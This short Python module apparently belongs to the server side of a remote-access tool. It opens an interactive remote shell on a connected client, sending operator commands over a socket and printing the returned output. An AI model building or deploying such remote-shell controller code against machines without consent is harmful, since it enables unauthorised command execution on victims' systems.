# commands/rshell.py
import subprocess
import threading

from colorama import Style

from Server.console_handler import command_finished

requires_id = True


def execute(conn, args, clients, id):
    command_finished.clear()
    conn.sendall(b'RSHELL')
    threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
    command_finished.clear()  # Clear the event here



def rshell_thread(conn):
    hostname = conn.getpeername()[0]
    while True:
        command = input("<" + hostname + ">:" + Style.RESET_ALL)
        if command.lower() == 'exit':
            command_finished.set()
            break
        conn.sendall(command.encode())
        results = b''
        while not results.endswith(b'\n'):
            chunk = conn.recv(1024)
            if not chunk:
                break
            results += chunk
        print("<" + hostname + ">: {}".format(results.decode('utf-8')))